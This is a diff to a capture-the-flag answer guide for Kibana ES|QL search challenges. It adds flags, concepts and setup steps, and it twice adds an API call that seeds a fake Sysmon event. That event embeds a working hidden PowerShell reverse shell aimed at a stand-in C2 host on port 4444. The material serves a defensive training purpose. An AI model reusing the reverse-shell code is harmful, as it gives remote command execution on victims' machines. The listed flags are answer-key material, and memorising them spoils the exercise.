@@ -138,9 +138,92 @@ ROW a = "ea2N0Zl9lc3aaxxbF9ap", b = "c19dub3Rfc3FsX3lheX0", c = "d2hvb3Bz", d = 
 ### 2. Flag `{ctf_c2_with_powershell_is_fun}`
 **Concept:** ES|QL Search - Flag found when showing all fields in the document
 
+API Call (Also used in future challenge (5))
+`PUT logs-windows.sysmon-default/_create/e2N0Zl93b3dfbmljZV9qb2JfZmluZGluZ190aGlzX2N1c3RvbV9pZH0`
+```json
+{
+  "@timestamp": "2024-12-18T02:02:09.241Z",
+  "message": "Just a regular event log, nothing to see here.",
+  "tags": [
+    "critical"
+  ],
+  "host": {
+    "name": "not_nics_machine"
+  },
+  "process": {
+    "name": "yams.exe",
+    "command_line": """
+    powershell -NoProfile -WindowStyle Hidden -Command "& {
+    $host = 'not-a-malware-c2';
+    $port = 4444;
+    $secret_key_1 = "{ctf_c2_with_powershell_is_fun}"
+    $client = New-Object System.Net.Sockets.TCPClient($host, $port);
+    $stream = $client.GetStream();
+    [byte[]]$buffer = New-Object byte[] 1024;
+    while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
+        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $bytesRead);
+        $result = iex $data 2>&1 | Out-String;
+        $response = (New-Object -TypeName System.Text.ASCIIEncoding).GetBytes($result);
+        $stream.Write($response, 0, $response.Length);
+        $stream.Flush();
+    }
+    $client.Close();
+}"
+      """
+  }
+}
+```
+
 Setup - Download and Import Saved Object: [12.ndjson](https://github.com/nicpenning/kibana-ctf/blob/main/ES|QL/12.ndjson)
 
 ### 3. Flag `{ctf_comments_for_the_win}`
 **Concept:** ES|QL Comments - Flag found when uncommenting all lines
 
 Setup - Download and Import Saved Object: [13.ndjson](https://github.com/nicpenning/kibana-ctf/blob/main/ES|QL/13.ndjson)
+
+### 4. Flag `{ctf_creating_lens_from_es|ql_is_kinda_cool}`
+**Concept:** ES|QL Lens - Flag found when editing Text elements of the Lens visual
+
+Setup - Download and Import Saved Object: [14.ndjson](https://github.com/nicpenning/kibana-ctf/blob/main/ES|QL/14.ndjson)
+
+### 5. Flag `{ctf_wow_nice_job_finding_this_custom_id}`
+**Concept:** ES|QL Metadata - Flag found when adding Meta Data to the from section of the query
+
+Setup - Download and Import Saved Object: [15.ndjson](https://github.com/nicpenning/kibana-ctf/blob/main/ES|QL/15.ndjson)
+
+API Call (Can be done in previous challenge (2))
+`PUT logs-windows.sysmon-default/_create/e2N0Zl93b3dfbmljZV9qb2JfZmluZGluZ190aGlzX2N1c3RvbV9pZH0`
+```json
+{
+  "@timestamp": "2024-12-18T02:02:09.241Z",
+  "message": "Just a regular event log, nothing to see here.",
+  "tags": [
+    "critical"
+  ],
+  "host": {
+    "name": "not_nics_machine"
+  },
+  "process": {
+    "name": "yams.exe",
+    "command_line": """
+    powershell -NoProfile -WindowStyle Hidden -Command "& {
+    $host = 'not-a-malware-c2';
+    $port = 4444;
+    $secret_key_1 = "{ctf_c2_with_powershell_is_fun}"
+    $client = New-Object System.Net.Sockets.TCPClient($host, $port);
+    $stream = $client.GetStream();
+    [byte[]]$buffer = New-Object byte[] 1024;
+    while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
+        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $bytesRead);
+        $result = iex $data 2>&1 | Out-String;
+        $response = (New-Object -TypeName System.Text.ASCIIEncoding).GetBytes($result);
+        $stream.Write($response, 0, $response.Length);
+        $stream.Flush();
+    }
+    $client.Close();
+}"
+      """
+  }
+}
+```
+
